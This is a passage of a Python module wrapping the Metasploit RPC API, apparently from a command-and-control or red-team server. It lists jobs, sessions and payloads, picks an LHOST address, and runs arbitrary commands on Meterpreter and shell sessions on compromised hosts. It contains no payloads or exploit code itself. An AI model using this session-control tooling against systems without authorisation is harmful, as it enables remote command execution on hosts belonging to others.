                utils.logger.log_message(f"Found {len(jobs)} total jobs. Force cleanup: {force}")
                for job_id, job_name in jobs.items():
                    utils.logger.log_message(f"  Job {job_id}: {job_name}")
            
            for job_id, job_name in list(jobs.items()):
                try:
                    if utils.logger:
                        utils.logger.log_message(f"Cleaning up job {job_id}: {job_name}")
                    
                    if force:
                        # Use force termination directly
                        success = self._force_stop_job(str(job_id))
                    else:
                        # Use normal stop logic
                        success, error = self.stop_listener(str(job_id))
                        if not success and utils.logger:
                            utils.logger.log_message(f"Normal stop failed for job {job_id}: {error}")
                    
                    if success:
                        cleaned_count += 1
                        
                except Exception as e:
                    if utils.logger:
                        utils.logger.log_message(f"Error cleaning up job {job_id}: {str(e)}")
            
            if utils.logger:
                utils.logger.log_message(f"Cleaned up {cleaned_count}/{len(jobs)} jobs")
                
            return cleaned_count
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error during all jobs cleanup: {str(e)}")
            return 0
    
    def list_jobs(self) -> List[Dict[str, Any]]:
        """List active Metasploit jobs"""
        if not self._ensure_connected():
            return []
            
        try:
            jobs = self._handlers.job.list()
            return [{"id": job_id, "name": job_info} for job_id, job_info in jobs.items()]
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error listing jobs: {str(e)}")
            return []
    
    def list_sessions(self) -> List[MetasploitSession]:
        """List active Metasploit sessions"""
        if not self._ensure_connected():
            return []
            
        try:
            sessions = self._handlers.session.list()
            session_list = []
            
            for session_id, session_info in sessions.items():
                session = MetasploitSession(
                    session_id=str(session_id),
                    session_type=session_info.get('type', ''),
                    info=session_info.get('info', ''),
                    tunnel_local=session_info.get('tunnel_local', ''),
                    tunnel_peer=session_info.get('tunnel_peer', ''),
                    via_exploit=session_info.get('via_exploit', ''),
                    via_payload=session_info.get('via_payload', ''),
                    platform=session_info.get('platform', ''),
                    arch=session_info.get('arch', ''),
                    username=session_info.get('username', ''),
                    computer=session_info.get('computer', ''),
                    uuid=session_info.get('uuid', '')
                )
                session_list.append(session)
                
            return session_list
            
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error listing sessions: {str(e)}")
            return []
    
    def get_sessions(self) -> Dict[str, Any]:
        """
        Get active Metasploit sessions in dictionary format for receiver compatibility
        
        Returns:
            Dictionary with success status and sessions data
        """
        if not self._ensure_connected():
            return {'success': False, 'error': 'Not connected to Metasploit RPC', 'sessions': {}}
            
        try:
            sessions = self._handlers.session.list()
            self._update_activity()  # Update activity timestamp
            
            return {
                'success': True,
                'sessions': sessions,
                'count': len(sessions)
            }
            
        except Exception as e:
            error_msg = f"Error getting sessions: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return {'success': False, 'error': error_msg, 'sessions': {}}
    
    def execute_session_command(self, session_id: str, command: str) -> Dict[str, Any]:
        """
        Execute a command on a Metasploit session
        
        Args:
            session_id: Session ID to execute command on
            command: Command to execute
            
        Returns:
            Dictionary with success status and output
        """
        if not self._ensure_connected():
            return {'success': False, 'error': 'Not connected to Metasploit RPC'}
            
        try:
            # First, check if the session exists by listing sessions
            sessions_data = self._handlers.session.list()
            if session_id not in sessions_data:
                return {'success': False, 'error': f'Session {session_id} not found'}
            
            session_info = sessions_data[session_id]
            session_type = session_info.get('type', '').lower()
            
            # Determine session type and use appropriate method
            if 'meterpreter' in session_type:
                # For Meterpreter sessions, use meterpreter_run_single
                result = self._handlers.session.meterpreter_run_single(session_id, command)
                output = result.get('data', '') if isinstance(result, dict) else str(result)
            else:
                # For shell sessions, write command and read output
                write_result = self._handlers.session.shell_write(session_id, command + '\n')
                # Small delay to allow command execution
                import time
                time.sleep(0.5)
                read_result = self._handlers.session.shell_read(session_id)
                output = read_result.get('data', '') if isinstance(read_result, dict) else str(read_result)
            
            self._update_activity()  # Update activity timestamp
            
            if utils.logger:
                utils.logger.log_message(f"Executed command on session {session_id} ({session_type}): {command}")
            
            return {
                'success': True,
                'output': output,
                'session_id': session_id,
                'session_type': session_type,
                'command': command
            }
            
        except Exception as e:
            error_msg = f"Error executing command on session {session_id}: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return {'success': False, 'error': error_msg}
    
    def get_payload_info(self, payload_type: str) -> Dict[str, Any]:
        """Get information about a specific payload module with automatic retry on session timeout"""
        if not self._ensure_connected():
            return {}
        
        def _get_payload_info_internal():
            if self._payload_generator:
                return self._payload_generator.get_payload_info(payload_type)
            else:
                # Fallback to direct handlers access
                return self._handlers.module.info('payload', payload_type)
        
        try:
            # Use retry logic for payload info retrieval
            result = self._handle_rpc_error_with_retry(_get_payload_info_internal)
            self._update_activity()  # Update activity timestamp on success
            return result
        except (AuthenticationError, ConnectionError) as e:
            if utils.logger:
                utils.logger.log_message(f"Connection error getting payload info for {payload_type}: {str(e)}")
            return {}
        except RpcMethodError as e:
            # RPC method errors contain meaningful messages now, so log them directly
            if utils.logger:
                utils.logger.log_message(f"Payload info error for {payload_type}: {str(e)}")
            return {}
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Unexpected error getting payload info for {payload_type}: {str(e)}")
            return {}
    
    def list_payloads(self, platform_filter: Optional[str] = None) -> List[str]:
        """List available payload modules, optionally filtered by platform with automatic retry"""
        if not self._ensure_connected():
            return []
        
        def _list_payloads_internal():
            if self._payload_generator:
                return self._payload_generator.list_payloads(platform_filter)
            else:
                # Fallback to direct handlers access
                payloads = self._handlers.module.payloads()
                
                if platform_filter:
                    # Filter by platform (e.g., 'windows', 'linux', 'python')
                    filtered = [p for p in payloads if platform_filter.lower() in p.lower()]
                    return sorted(filtered)
                else:
                    return sorted(payloads)
        
        try:
            # Use retry logic for payload listing
            result = self._handle_rpc_error_with_retry(_list_payloads_internal)
            self._update_activity()  # Update activity timestamp on success
            return result
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Error listing payloads: {str(e)}")
            return []
    
    def get_server_ip(self) -> str:
        """Get the server IP for LHOST defaults"""
        if self.config.MSF_DEFAULT_LHOST:
            return self.config.MSF_DEFAULT_LHOST
            
        # Try to detect external IP
        try:
            # Try to get IP by connecting to a remote host
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.settimeout(1)
                s.connect(('8.8.8.8', 80))
                local_ip = s.getsockname()[0]
                return local_ip
        except:
            pass
            
        # Fallback to localhost
        return '127.0.0.1'
    
    def test_connection(self) -> Tuple[bool, str]:
        """Test connection to Metasploit RPC and return status"""
        if not self.is_enabled:
            return False, "Metasploit integration is disabled"
            
        if self.connect():
            try:
                if self._handlers:
                    version_info = self._handlers.core.version()
                    version = version_info.get('version', 'Unknown')
                    return True, f"Connected to Metasploit Framework {version}"
                else:
                    return True, "Connected to Metasploit RPC"
            except Exception as e:
                return False, f"Connection test failed: {str(e)}"
        else:
            return False, "Failed to connect to Metasploit RPC"
    
    def diagnose_connection(self) -> Dict[str, Any]:
        """
        Perform comprehensive diagnostics on Metasploit connection
        
        Returns:
            Dictionary with diagnostic information
        """
        if not self.is_enabled:
            return {'error': 'Metasploit integration is disabled'}
        
        if not self._ensure_connected():
            return {'error': 'Failed to establish connection to Metasploit RPC'}
        
        if utils.logger:
            utils.logger.log_message("Running Metasploit connection diagnostics...")
        
        try:
            # Run comprehensive diagnostics
            diagnostics = self._handlers.diagnose_connection()
            
            # Log diagnostic results
            if utils.logger:
                if diagnostics['errors']:
                    utils.logger.log_message(f"Metasploit diagnostics found {len(diagnostics['errors'])} issues:")
                    for error in diagnostics['errors']:
                        utils.logger.log_message(f"  - {error}")
                else:
                    utils.logger.log_message("Metasploit diagnostics completed successfully")
            
            return diagnostics
            
        except Exception as e:
            error_msg = f"Diagnostic check failed: {str(e)}"
            if utils.logger:
                utils.logger.log_message(error_msg)
            return {'error': error_msg}


# Global service instance (singleton pattern)
_metasploit_service_instance: Optional[MetasploitService] = None

def get_metasploit_service(config: ServerConfig = None) -> Optional[MetasploitService]:
    """
    Get the global Metasploit service instance
    
    Args:
        config: Optional ServerConfig, uses default if not provided
        
    Returns:
        MetasploitService instance if available and connected, None otherwise
    """
    global _metasploit_service_instance
    
    # Create instance if it doesn't exist
    if _metasploit_service_instance is None:
        try:
            _metasploit_service_instance = MetasploitService(config)
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Failed to create Metasploit service instance: {e}")
            return None
    
    # Ensure the service is connected
    if not _metasploit_service_instance.is_connected:
        try:
            if not _metasploit_service_instance.connect():
                if utils.logger:
                    utils.logger.log_message("Metasploit service not connected")
                return None
        except Exception as e:
            if utils.logger:
                utils.logger.log_message(f"Failed to connect Metasploit service: {e}")
            return None
    
    return _metasploit_service_instance

def set_metasploit_service(service: Optional[MetasploitService]):
    """
    Set the global Metasploit service instance (useful for testing)
    
    Args:
        service: MetasploitService instance or None
    """
    global _metasploit_service_instance
    _metasploit_service_instance = service

def reset_metasploit_service():
    """Reset the global Metasploit service instance"""
    global _metasploit_service_instance
    if _metasploit_service_instance:
        try:
            _metasploit_service_instance.disconnect()
        except:
            pass
    _metasploit_service_instance = None